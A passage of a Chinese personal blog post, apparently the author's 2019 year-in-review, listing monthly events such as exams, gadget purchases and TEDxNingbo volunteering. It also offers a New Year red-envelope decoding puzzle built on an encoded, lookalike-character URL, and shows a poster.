data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24x3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"}]